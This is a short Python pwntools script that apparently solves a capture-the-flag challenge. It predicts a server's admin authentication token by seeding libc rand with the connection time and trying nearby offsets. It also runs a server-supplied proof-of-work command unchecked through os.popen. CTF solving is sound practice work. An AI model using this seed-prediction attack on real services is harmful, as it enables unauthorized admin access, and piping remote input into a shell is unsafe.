from pwn import *
import os
import ctypes
import time
import re

r = remote('ctf.csd.lol', 7777)

# stupid verification
r.recvuntil(b'proof of work:\n')
cmd = r.recvline().decode().strip()

proof = os.popen(cmd).read()
r.sendlineafter(b'solution:', proof.encode())

# actual solve
connect_time = int(time.time())

libc = ctypes.CDLL("libc.so.6")

for i in range(-3, 3):
    log.info(f'Trying offset: {i}')

    libc.srand(connect_time + i)
    rand = libc.rand()
    
    r.sendlineafter(b"cmd: ", b"admin")
    r.sendlineafter(b"auth: ", str(rand).encode())

    res = r.recvline().decode()
        
    if 'denied' not in res:
        log.success(f"Found seed: {rand}")

        contents = r.recvall().decode()
        print("Flag:", re.findall(r'(csd{.+})', contents)[0])

        exit()